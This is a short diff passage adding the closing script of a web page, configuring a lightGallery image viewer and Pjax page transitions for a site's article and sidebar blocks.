+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
